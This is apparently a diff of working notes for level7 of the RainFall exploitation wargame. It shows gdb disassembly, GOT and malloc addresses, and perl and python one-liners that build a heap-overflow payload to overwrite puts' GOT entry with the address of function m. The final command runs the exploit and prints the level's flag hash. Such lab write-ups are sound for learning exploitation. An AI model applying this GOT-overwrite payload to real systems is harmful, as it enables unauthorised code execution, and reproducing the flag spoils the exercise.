@@ -58,7 +58,7 @@ Dump of assembler code for function main:
 End of assembler dump.
 
 
-Dump of assembler code for function m:  0x80484f4 \x08\x04\x84\xf4
+Dump of assembler code for function m:  0x80484f4 \x08\x04\x84\xf4 \xf4\x84\x04\x08
    0x080484f4 <+0>:	push   %ebp
    0x080484f5 <+1>:	mov    %esp,%ebp
    0x080484f7 <+3>:	sub    $0x18,%esp
@@ -76,3 +76,27 @@ End of assembler dump.
 
 0x8049928 puts 	adress  \x08\x04\x99\x28
 0x80484f4 m 	adress	\x08\x04\x84\xf4
+
+
+08048400 <puts@plt>:
+ 8048400:	ff 25 28 99 04 08    	jmp    *0x8049928   \x28\x99\x04\x08
+ 8048406:	68 28 00 00 00       	push   $0x28
+ 804840b:	e9 90 ff ff ff       	jmp    80483a0 <_init+0x34>
+
+(gdb) run `perl -e 'print "A"x1024 . "\xfc\xff\xff\xff"x2 . "XXXX" . "\x84\x96\x04\x08" . "\x70\xff\xff\xbf"'`
+
+$(python -c 'print "A" * 20 + "\xfc\xff\xff\xff"*2 + "XXXX"')
+
+
+malloc 	01 = 0x804a008
+		02 = 0x804a018
+		03 = 0x804a028
+		04 = 0x804a038
+
+strcpy buf	 01 = 0x804a018
+			02 = 0x804a038
+
+level7@RainFall:~$ ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ - 1642786301
+
